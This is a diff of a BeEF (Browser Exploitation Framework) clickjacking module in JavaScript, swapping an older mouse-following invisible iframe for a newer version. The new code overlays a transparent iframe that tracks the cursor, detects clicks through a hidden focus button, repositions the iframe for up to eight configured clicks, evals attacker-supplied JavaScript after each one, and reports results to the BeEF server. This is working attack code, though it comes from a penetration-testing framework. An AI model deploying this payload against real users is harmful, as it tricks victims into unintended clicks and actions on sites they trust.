@@ -1,92 +1,139 @@
-//
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
-//
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
-//
+/*
+ * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+ * Browser Exploitation Framework (BeEF) - http://beefproject.com
+ * See the file 'doc/COPYING' for copying permission
+ */
+
 beef.execute(function() {
-
-	var offset_top  = "<%= @offset_top %>";
-	var offset_left = "<%= @offset_left %>";
-	var url = "<%= @url %>";
-	var debug = <%= @debug %>;
-
-	if (debug) opacity = 10; else opacity = 0;
-
-	// create container
-	var cjcontainer = document.createElement('div');
-	cjcontainer.id = "cjcontainer";
-	cjcontainer.setAttribute("style", "-moz-opacity:"+opacity);
-	cjcontainer.style.zIndex = 999;
-	cjcontainer.style.border = "none";
-	cjcontainer.style.width = "30px";
-	cjcontainer.style.height = "20px";
-	cjcontainer.style.overflow = "hidden";
-	cjcontainer.style.position = "absolute";
-	cjcontainer.style.opacity = opacity;
-	cjcontainer.style.filter = "alpha(opacity="+opacity+")";
-	cjcontainer.style.cursor = "default";
-	document.body.appendChild(cjcontainer);
-
-	// create iframe
-	var cjiframe = document.createElement('iframe');
-	cjiframe.id = "cjiframe";
-	cjiframe.src = url;
-	cjiframe.scrolling = "no";
-	cjiframe.frameBorder = "0";
-	cjiframe.allowTransparency = "true";
-	cjiframe.style.overflow = "hidden";
-	cjiframe.style.position = "absolute";
-	cjiframe.style.top = offset_top+"px";
-	cjiframe.style.left = offset_left+"px";
-	cjiframe.style.width = "200px";
-	cjiframe.style.height = "100px";
-	cjiframe.style.border = "none";
-	cjiframe.style.cursor = "default";
-	cjcontainer.appendChild(cjiframe);
-
-	// followmouse code by rsnake
-	// http://ha.ckers.org/weird/followmouse.html
-	// modified by bcoles
-	function followmouse(e){
-
-		var xcoord = 0;
-		var ycoord = 0;
-		var gettrailobj = function() {
-			if (document.getElementById)
-				return document.getElementById("cjcontainer").style;
-			else if (document.all)
-				return document.all.container.style;
-		}
-		if (typeof e != "undefined") {
-			xcoord += e.pageX - 10;
-			ycoord += e.pageY - 15;
-		} else if (typeof window.event != "undefined") {
-			xcoord += document.body.scrollLeft + event.clientX; 
-			ycoord += document.body.scrollTop + event.clientY;
-		}
-		var docwidth = document.all ? document.body.scrollLeft + document.body.clientWidth : pageXOffset+window.innerWidth - 15;
-		var docheight = document.all ? Math.max(document.body.scrollHeight, document.body.clientHeight) : Math.max(document.body.offsetHeight, window.innerHeight)
-		gettrailobj().left = xcoord + "px";
-		gettrailobj().top  = ycoord + "px";
+	var elems = {
+		outerFrame: "cjFrame",
+		innerFrame: "innerFrame",
+		btn: "persistentFocusBtn"
 	}
 
-	// hook to mousemove event
-	if (window.addEventListener) {
-		window.addEventListener('mousemove', followmouse, false);
-	} else if (window.attachEvent) {
-		window.attachEvent('mousemove', followmouse);
+	var clicked = 0;
+	var src = "<%= @iFrameSrc %>";
+	var secZone = "<%= @iFrameSecurityZone %>";
+	var sandbox = "<%= @iFrameSandbox %>";
+	var visibility = "<%= @iFrameVisibility %>";
+
+	var clicks = [
+		{js:"<%= URI.escape(@clickaction_1) %>", posTop:cleanPos("<%= @iFrameTop_1 %>"), posLeft:cleanPos("<%= @iFrameLeft_1 %>")},
+		{js:"<%= URI.escape(@clickaction_2) %>", posTop:cleanPos("<%= @iFrameTop_2 %>"), posLeft:cleanPos("<%= @iFrameLeft_2 %>")},
+		{js:"<%= URI.escape(@clickaction_3) %>", posTop:cleanPos("<%= @iFrameTop_3 %>"), posLeft:cleanPos("<%= @iFrameLeft_3 %>")},
+		{js:"<%= URI.escape(@clickaction_4) %>", posTop:cleanPos("<%= @iFrameTop_4 %>"), posLeft:cleanPos("<%= @iFrameLeft_4 %>")},
+		{js:"<%= URI.escape(@clickaction_5) %>", posTop:cleanPos("<%= @iFrameTop_5 %>"), posLeft:cleanPos("<%= @iFrameLeft_5 %>")},
+		{js:"<%= URI.escape(@clickaction_6) %>", posTop:cleanPos("<%= @iFrameTop_6 %>"), posLeft:cleanPos("<%= @iFrameLeft_6 %>")},
+		{js:"<%= URI.escape(@clickaction_7) %>", posTop:cleanPos("<%= @iFrameTop_7 %>"), posLeft:cleanPos("<%= @iFrameLeft_7 %>")},
+		{js:"<%= URI.escape(@clickaction_8) %>", posTop:cleanPos("<%= @iFrameTop_8 %>"), posLeft:cleanPos("<%= @iFrameLeft_8 %>")},
+		{js:"void(0);", posTop:'-', posLeft:'-'}
+	]
+
+	var iframeAttrs = {};
+	iframeAttrs.src = src;
+	(secZone == "on") ? iframeAttrs.security = "restricted" : "";
+	(sandbox == "on") ? iframeAttrs.sandbox = "allow-forms" : "";
+
+	var iframeStyles = {};
+	iframeStyles.width = "<%= @iFrameWidth %>px";
+	iframeStyles.height = "<%= @iFrameHeight %>px";
+	iframeStyles.opacity = (visibility == "on") ? "0.6" : "0.0";
+	iframeStyles.filter = (visibility == "on") ? "alpha(opacity=60)" : "alpha(opacity=0)";
+
+	var innerPos = {};
+	//initialize iframe
+	innerPos.top = clicks[0].posTop + "px";
+	innerPos.left = clicks[0].posLeft + "px";
+
+	//returns a negative version of a number, or if NaN returns a dash
+	function cleanPos(coordinate) {
+		var iCoordinate = parseInt(coordinate);
+		if (isNaN(iCoordinate))
+			return "-";
+		else if (iCoordinate > 0)
+			return (-1 * iCoordinate)
+		return iCoordinate
 	}
 
-	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'clickjack=hooked mousemove event');
+	function init(params, styles, stylesInner, callback) {
+		var container = $j.extend(true, {'border':'none', 'position':'absolute', 'z-index':'100000', 'overflow':'hidden'}, styles);
+		var inner = $j.extend(true, {'border':'none', 'position':'absolute', 'width':'2000px', 'height':'10000px'}, stylesInner);
 
+		var containerDiv = $j('<div id="' + elems.outerFrame + '"></div>').css(container).prependTo('body');
+		var containerDiv = $j('<input id="' + elems.btn + '" type="button" value="invisible" style="width:1px;height:1px;opacity:0;alpha(opacity=0);margin-left:-200px" />').appendTo('body');
+
+		var innerIframe = $j('<iframe id="' + elems.innerFrame + '" scrolling="no" />').attr(params).css(inner).load(callback).prependTo('#' + elems.outerFrame);
+
+		return containerDiv;
+	}
+
+	function step1(){
+		var btnSelector = "#" + elems.btn;
+		var outerSelector = "#" + elems.outerFrame;
+		var btnObj = $j(btnSelector);
+		var outerObj = $j(outerSelector);
+
+		$j("body").mousemove(function(e) {
+			$j(outerObj).css('top', e.pageY);
+			$j(outerObj).css('left', e.pageX);
+		});
+
+		$j(btnObj).focus();
+		$j(btnObj).focusout(function() {
+			cjLog("Iframe clicked");
+			iframeClicked();
+		});
+	}
+
+	function iframeClicked(){
+		clicked++;
+		var jsfunc = '';
+		jsfunc = clicks[clicked-1].js;
+		innerPos.top = clicks[clicked].posTop;
+		innerPos.left = clicks[clicked].posLeft;
+		eval(unescape(jsfunc));
+		setTimeout(function(){
+			updateIframePosition();
+		}, <%= @clickDelay %>);
+
+		setTimeout(function(){
+			var btnSelector = "#" + elems.btn;
+			var btnObj = $j(btnSelector);
+			$j(btnObj).focus();
+
+			//check if there are any more actions to perform
+			try {
+				if (isNaN(parseInt(clicks[clicked].posTop))) {
+					removeAll(elems);
+					throw "No more clicks.";
+				}
+			} catch(e) {
+				cjLog(e);
+			}
+		}, 200);
+	}
+
+	function updateIframePosition(){
+		var innerSelector = "#" + elems.innerFrame;
+		var innerObj = $j(innerSelector);
+		$j(innerObj).css('top', innerPos.top + 'px');
+		$j(innerObj).css('left', innerPos.left + 'px');
+	}
+
+	//Remove outerFrame and persistent button
+	function removeAll(){
+		$j("#" + elems.outerFrame).remove();
+		$j("#" + elems.btn).remove();
+	}
+
+	function cjLog(msg){
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=' + msg);
+	}
+
+	init(iframeAttrs, iframeStyles, innerPos,
+		function() {
+			step1();
+			cjLog("Iframe successfully created.");
+		}
+	);
 });
